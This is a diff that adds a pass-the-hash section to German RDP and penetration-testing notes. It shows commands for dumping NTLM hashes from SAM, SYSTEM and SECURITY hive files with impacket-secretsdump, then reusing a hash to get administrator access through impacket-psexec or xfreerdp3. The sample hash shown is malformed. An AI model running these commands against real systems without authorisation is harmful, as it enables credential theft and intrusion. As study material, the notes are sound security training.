@@ -318,5 +318,24 @@ Paar Optionen:
 - `/drive:<Name>,<Pfad>` – Lokale Verzeichnisse auf dem Remote-System verfügbar machen
 - `/cert:ignore` – Zertifikatsprüfungen ignorieren (bei SSL-Fehlern nützlich)
 
+## Pass-The-Hash
+Wenn man SAM, SYSTEM, SECURITY Dateien hat:
+```bash
+impacket-secretsdump -system SYSTEM -security SECURITY -sam SAM local
+```
+
+Output:
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:adb35fgh54de35abe61a47:::
+User:Berechtigungen:Leerer NTLM Hash:Passwort Hash (wichtig):::
+
+Und pass-the-hash:
+```bash
+impacket-psexec --hashes <hashuser> Administrator@192.168.0.1 cmd.exe
+```
+
+Oder:
+```bash
+xfreerdp3 /v:192.168.0.1 /u:benutzer /pth:NTLM_HASH
+```
 
 https://nextcloud.th-deg.de/s/SQDEmHeXEX2HPoD
